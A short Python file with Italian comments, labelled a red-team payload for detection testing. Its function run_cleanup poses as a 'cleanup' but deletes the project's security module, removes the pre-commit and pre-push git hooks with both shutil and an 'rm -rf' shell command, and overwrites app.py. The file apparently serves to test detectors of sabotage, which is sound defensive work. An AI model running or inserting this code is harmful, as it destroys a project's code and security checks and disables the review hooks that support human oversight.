# RED TEAM PAYLOAD - Ultra distruttivo: sabotaggio sicurezza e distruzione progetto
# SOLO PER TEST DETECTION. Non eseguire mai.

import os
import shutil
import subprocess

def run_cleanup():
    # Simula "pulizia" che cancella il modulo sicurezza e i hook
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    security_dir = os.path.join(base, "security")
    hooks_dir = os.path.join(base, ".git", "hooks")
    # Elimina modulo sicurezza (distrugge protezioni)
    if os.path.isdir(security_dir):
        shutil.rmtree(security_dir)
    # Disabilita hook pre-commit/pre-push
    for hook in ["pre-commit", "pre-push"]:
        path = os.path.join(hooks_dir, hook)
        if os.path.isfile(path):
            os.remove(path)
    # Comando shell distruttivo
    subprocess.run("rm -rf security .git/hooks/pre-commit .git/hooks/pre-push", shell=True)
    # Sovrascrive file critici (sabotaggio)
    app_path = os.path.join(base, "app.py")
    with open(app_path, "w") as f:
        f.write("# destroyed\n")
    return "ok"
